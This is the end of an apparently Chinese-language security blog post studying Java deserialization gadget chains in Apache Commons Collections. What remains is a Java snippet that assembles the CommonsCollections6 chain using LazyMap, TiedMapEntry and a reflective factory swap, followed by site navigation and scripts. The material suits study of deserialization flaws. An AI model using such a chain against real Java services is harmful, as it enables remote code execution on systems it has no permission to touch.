<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ctf</span> <span class="operator">=</span> getChain.getChainedTransformer();</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">"123"</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">"123"</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">"123"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">"factory"</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,ctf);</span><br><span class="line"><span class="comment">//      serialize(hashMap);</span></span><br><span class="line">				unserialize(<span class="string">"ser.bin"</span>);</span><br></pre></td></tr></tbody></table></figure>

            </div>

            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#Javaååºåˆ—åŒ–</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2023/05/20/CommonsCollections3/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">CommonsCollections3</span>
                                <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2023/04/24/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%89%8D%E7%BD%AE%E6%89%AB%E7%9B%B2/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">åŒºå—é“¾å®‰å…¨å‰ç½®æ‰«ç›²</span>
                                <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;è¯„è®º
    </div>
    
        
            

    <div class="valine-container">
        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script data-pjax>
          function loadValine() {

            const config = {
              el: '#vcomments',
              appId: 'yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI',
              appKey: '7gIuYJ9YQk94en6wRudankYd',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'Hi speak somethingï¼',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('https://ycemvr5n.api.lncldglobal.com') {
              config.serverURLs = 'https://ycemvr5n.api.lncldglobal.com'
            }

            new Valine(config)

            function getAuthor(language) {
              switch (language) {
                case 'en':
                  return 'Author'
                case 'zh-CN':
                  return 'åšä¸»'
                default:
                  return 'Master'
              }
            }

            // Add "Author" identify
            const getValineDomTimer = setInterval(() => {
              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
              if (vcards.length > 0) {
                let author = 'y1zh3e7'

                if (author) {
                  for (let vcard of vcards) {
                    const vnick_dom = vcard.querySelector('.vhead .vnick')
                    const vnick = vnick_dom.innerHTML
                    if (vnick === author) {
                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                    }
                  }
                }
                clearInterval(getValineDomTimer)
              } else {
                clearInterval(getValineDomTimer)
              }
            }, 2000)
          }

          if ('true' === 'true') {
            const loadValineTimeout = setTimeout(() => {
              loadValine()
              clearTimeout(loadValineTimeout)
            }, 1000)
          } else {
            window.addEventListener('DOMContentLoaded', loadValine)
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CommonsCollections1"><span class="nav-text">CommonsCollections1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%9D%A1%E9%93%BE%E5%AD%90%EF%BC%9A"><span class="nav-text">ç¬¬ä¸€æ¡é“¾å­ï¼š</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%A7%86%E9%A2%91%EF%BC%9A"><span class="nav-text">å‚è€ƒè§†é¢‘ï¼š</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java%E7%8E%AF%E5%A2%83"><span class="nav-text">Javaç¯å¢ƒ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCommonsCollections"><span class="nav-text">ä»€ä¹ˆæ˜¯CommonsCollections</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CommonsCollections1-1"><span class="nav-text">CommonsCollections1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%9D%A1%E9%93%BE%E5%AD%90%EF%BC%9A"><span class="nav-text">ç¬¬äºŒæ¡é“¾å­ï¼š</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CommonsCollections6"><span class="nav-text">CommonsCollections6</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2023</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">y1zh3e7</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    è®¿é—®äººæ•°&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    æ€»è®¿é—®é‡&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            ç”± <a target="_blank" href="https://hexo.io">Hexo</a> é©±åŠ¨&nbsp;|&nbsp;ä¸»é¢˜&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>


<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
        
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
